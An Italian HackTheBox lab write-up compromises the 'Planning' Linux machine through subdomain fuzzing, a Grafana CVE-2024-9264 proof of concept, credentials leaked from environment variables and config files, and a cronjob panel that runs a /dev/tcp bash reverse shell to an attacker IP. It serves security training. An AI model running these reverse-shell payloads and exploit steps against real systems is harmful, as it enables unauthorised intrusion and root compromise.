<img src="../images/planning.png" alt="planning" style="border-radius: 50%; width: 150px;">

# Planning - HackTheBox Writeup
> **Difficulty:** Easy &nbsp;|&nbsp; **OS:** Linux &nbsp;|&nbsp; **Season:** 7 - Resistance &nbsp;|&nbsp; **Date:** 09 Jun 2026

---

## Enumeration

### Nmap

```bash
sudo masscan -p1-65535 10.10.11.68 --rate=500 --interface tun0
nmap -sV -sC -p 22,80 10.10.11.68 -oN nmap.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

Due porte aperte. Si parte dall'applicazione web su porta 80.

---

### Web - Directory & Subdomain Fuzzing

Enumerazione dei path nascosti (nessun risultato rilevante):

```bash
ffuf -u http://planning.htb/FUZZ -w directory-list-2.3-medium.txt -s
```

Enumerazione dei sottodomini — si trova **`grafana.planning.htb`**:

```bash
ffuf -u http://10.10.11.68 \
     -H "Host: FUZZ.planning.htb" \
     -w /usr/share/seclists/Discovery/DNS/namelist.txt \
     -c -t 50 -fs 178 -s
```

Si aggiunge `grafana.planning.htb` al file `/etc/hosts` e si naviga all'istanza Grafana.  
HTB fornisce direttamente le credenziali iniziali:

```
admin / 0D5oT70Fq13EvB5r
```

Versione rilevata: **Grafana v11.0.0**

---

## Exploitation - CVE-2024-9264 (Grafana RCE)

Cercando su GitHub si trova **CVE-2024-9264**, una vulnerabilità di Remote Code Execution in Grafana <= 11.0.0 che sfrutta l'engine DuckDB nelle data source.

```bash
python3 poc.py http://grafana.planning.htb \
    --username admin \
    --password 0D5oT70Fq13EvB5r \
    --reverse-ip 10.10.14.131 \
    --reverse-port 4444
```

Si ottiene una shell come utente `root` all'interno di un container Docker.

---

## Lateral Movement

### Riconoscimento del container

La presenza di `/.dockerenv` nella root conferma che si è all'interno di un container. Si esegue `env` per estrarre variabili d'ambiente:

```
enzo:RioTecRANDEntANT!
```

### Info.php & credenziali MySQL

Navigando l'applicazione si trova `info.php`, che espone la configurazione del database:

```
$servername = localhost
$user       = root
$password   = EXTRapHY
$dbname     = edukate
```

Le credenziali MySQL portano a credenziali utente web, non direttamente utili. Si prosegue la ricerca.

### Crontab database

Esplorando il filesystem si trova il file:

```
/opt/crontabs/crontab.db
```

Leggendone il contenuto si ricavano le credenziali dell'utente `root` della macchina host:

```
root:P4ssw0rdS0pRi0T3c
```

### SSH come enzo

Con le credenziali trovate in precedenza via `env`, ci si connette alla macchina host:

```bash
ssh enzo@10.10.11.68
# password: RioTecRANDEntANT!
```

---

## Privilege Escalation - Cronjob Manager via Port Forwarding

### Scoperta della porta locale

```bash
ss -tulnp
```

Si nota un servizio in ascolto solo su `127.0.0.1:8000`. Si effettua il port forwarding tramite SSH:

```bash
ssh -L 8080:localhost:8000 enzo@10.10.11.68
```

Navigando su `http://localhost:8080` si accede a un pannello di gestione dei cronjob.

### Reverse shell come root

Si crea un nuovo cronjob con il seguente payload:

```
bash -c "exec bash -i &>/dev/tcp/10.10.14.131/4444 0>&1"
```

Si avvia il listener e si attende l'esecuzione:

```bash
nc -lvnp 4444
```

Si ottiene una shell come **`root`** sulla macchina host.

---

## Lessons Learned

| # | Takeaway |
|---|----------|
| 1 | L'enumerazione dei sottodomini è fondamentale, può esporre superfici d'attacco critiche nascoste al dominio principale |
| 2 | Verificare sempre la versione esatta dei servizi esposti: CVE-2024-9264 colpisce una versione molto recente di Grafana |
| 3 | In un container, `env` e i file di configurazione web (es. `info.php`) possono rivelare credenziali riutilizzabili |
| 4 | File come `/opt/crontabs/crontab.db` in posizioni non standard ma possono contenere credenziali privilegiate |
| 5 | Un servizio esposto solo su `localhost` non è sicuro: il port forwarding SSH lo rende raggiungibile e sfruttabile |
